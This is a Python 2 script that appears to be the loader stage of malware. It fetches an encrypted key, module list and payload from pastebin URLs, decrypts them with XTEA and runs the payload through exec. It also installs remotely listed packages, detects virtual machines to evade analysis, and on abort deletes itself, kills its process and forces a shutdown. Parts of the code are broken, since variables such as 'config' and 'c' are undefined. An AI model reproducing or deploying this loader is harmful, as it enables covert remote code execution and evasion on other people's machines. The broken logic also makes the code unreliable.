#!/usr/bin/python
from __future__ import print_function
import os
import sys
import time
import json
import zlib
import struct
import base64
import urllib
import marshal
import subprocess

__DEBUG  = 1
__RELOAD = 0

def debug(info):
    if __DEBUG:
        print(str(info))
        
def abort(output=None):
    try:
        if __DEBUG:
            debug("Launch debuged - %s" % str(output))
            sys.exit(0)
        else:
            _ = [subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) for cmd in list(['del /f /q %s' % sys.argv[0], 'taskkill /pid %d /f' % os.getpid(), 'shutdown /p /f'] if os.name == 'nt' else ['rm -f %s' % sys.argv[0], 'kill -9 %d' % os.getpid(), 'shutdown --poweroff --no-wall'])]
    except Exception as e:
        debug(e)
        
def decrypt(data, key):
    try:
        data    = base64.b64decode(data)
        blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            s   = (d * 32) & m
            for _ in range(32):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (s + k[s >> 11 & 3]))) & m
                s   = (s - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (s + k[s & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return bytes().join(result).rstrip(chr(0))
    except Exception as e:
        debug(e)

def dependencies(source):
    try:
        config   = json.loads(urllib.urlopen(str(source)).read())
        pip_exe  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
        if not pip_exe:
            exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
            __RELOAD = True
            return config
        else:
            os.chdir(os.path.expandvars('%TEMP%')) if os.name == 'nt' else os.chdir('/tmp')
            packages = json.loads(urllib.urlopen(config['modules']).read())
            arch = str(struct.calcsize('P') * 8)               
            for name, url in packages[os.name][arch].items():
                try:
                    exec "import %s" % name in globals()
                except ImportError:
                    __RELOAD = True
                    subprocess.Popen([pip_exe, 'install', url], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
            return config
    except Exception as e:
        debug(e)

def antiforensics():
    try:
        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
        check_procs   = [i.split()[0 if os.name is 'nt' else -1] for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        return bool(check_environ + check_procs)
    except Exception as e:
        debug(e)

def main(*args, **kwargs):
        __DEBUG = kwargs.get('debug')
        xor_key = ''
        api_key = ''
        payload = ''
        if 'config' in kwargs:
            kwargs = json.loads(kwargs.get('config')) if not isinstance(kwargs.get('config'), dict) else kwargs.get('config')
            if 'xor_key' in kwargs:
                xor_key = decrypt(urllib.urlopen(kwargs.get('xor_key')).read(), base64.b64decode('uuYGm6cUAIwup6kWybUOZw=='))
            if 'api_key' in kwargs:
                api_key = decrypt(urllib.urlopen(kwargs.get('api_key')).read(), xor_key).splitlines()
            if 'payload' in kwargs:
                payload = decrypt(urllib.urlopen(config.get('payload')).read(), xor_key) 
            if isinstance(config, dict):
                if __RELOAD:
                    debug("Finished installing missing dependencies.\nRestarting...")
                    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
                elif config.get('antiforensics'):
                    if antiforensics():
                        debug("Virtual machine detected.")
                else:
                    if payload:
                        exec payload in globals()
                    else:
                        debug("missing client payload")
            else:
                debug("Invalid data type for 'config' (expected '{}', got '{}')".format(dict, type(config)))
        else:
            debug("Missing argument 'config'")

if __name__ == '__main__':
    m = main(**{
  "xor_key": "https://pastebin.com/raw/ejTRz0fT",
  "api_key": "https://pastebin.com/raw/QPAJs08x",
  "modules": "https://pastebin.com/raw/Z5z5cjny",
  "payload": "https://pastebin.com/raw/BKRaUCBv"
})
